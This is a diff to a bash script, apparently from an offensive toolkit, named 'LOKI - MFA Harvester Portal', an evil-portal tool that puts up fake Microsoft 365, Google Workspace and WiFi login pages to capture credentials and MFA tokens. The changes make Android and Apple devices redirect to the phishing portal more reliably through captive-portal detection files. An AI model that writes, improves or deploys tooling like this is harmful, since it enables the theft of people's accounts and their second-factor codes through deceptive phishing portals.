@@ -1,7 +1,7 @@
 #!/bin/bash
 # Title: LOKI - MFA Harvester Portal
 # Description: Real-time credential and MFA token capture via Evil Portal
-# Author: JMFH / FENRIR / HaleHound
+# Author: HaleHound
 # Version: 1.0.1
 # Category: credential-harvesting
 # Named after the Norse trickster god - master of deception
@@ -303,12 +303,14 @@ HELPEOF
 }
 EPEOF
 
-    # Captive portal detection files
-    cat > "$portal_path/generate_204" << GENEOF
-<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/"></head><body></body></html>
+    # Captive portal detection files (PHP for proper Content-Type)
+    cat > "$portal_path/generate_204.php" << 'GENEOF'
+<?php header("Content-Type: text/html"); header("Location: /"); exit; ?>
 GENEOF
 
-    cp "$portal_path/generate_204" "$portal_path/hotspot-detect.html"
+    cat > "$portal_path/hotspot-detect.html" << GENEOF
+<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/"></head><body></body></html>
+GENEOF
 
     chmod -R 755 "$portal_path"
     LOG "Microsoft 365 portal installed at $portal_path"
@@ -430,10 +432,13 @@ GEOF
 }
 EPEOF
 
-    cat > "$portal_path/generate_204" << GENEOF
+    cat > "$portal_path/generate_204.php" << 'GENEOF'
+<?php header("Content-Type: text/html"); header("Location: /"); exit; ?>
+GENEOF
+
+    cat > "$portal_path/hotspot-detect.html" << GENEOF
 <!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/"></head><body></body></html>
 GENEOF
-    cp "$portal_path/generate_204" "$portal_path/hotspot-detect.html"
 
     chmod -R 755 "$portal_path"
     LOG "Google Workspace portal installed at $portal_path"
@@ -546,10 +551,13 @@ WCAPTEOF
 }
 EPEOF
 
-    cat > "$portal_path/generate_204" << GENEOF
+    cat > "$portal_path/generate_204.php" << 'GENEOF'
+<?php header("Content-Type: text/html"); header("Location: /"); exit; ?>
+GENEOF
+
+    cat > "$portal_path/hotspot-detect.html" << GENEOF
 <!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/"></head><body></body></html>
 GENEOF
-    cp "$portal_path/generate_204" "$portal_path/hotspot-detect.html"
 
     chmod -R 755 "$portal_path"
     LOG "WiFi captive portal installed at $portal_path"
@@ -571,7 +579,9 @@ activate_portal() {
     ln -sf "$portal_path/capture.php" /www/capture.php
 
     # Captive portal detection
-    ln -sf "$portal_path/generate_204" /www/generate_204
+    # Android requests /generate_204 - use directory with index.php
+    mkdir -p /www/generate_204
+    echo '<?php header("Location: /"); exit; ?>' > /www/generate_204/index.php
     ln -sf "$portal_path/hotspot-detect.html" /www/hotspot-detect.html
 
     # CRITICAL: Restore captiveportal API symlink
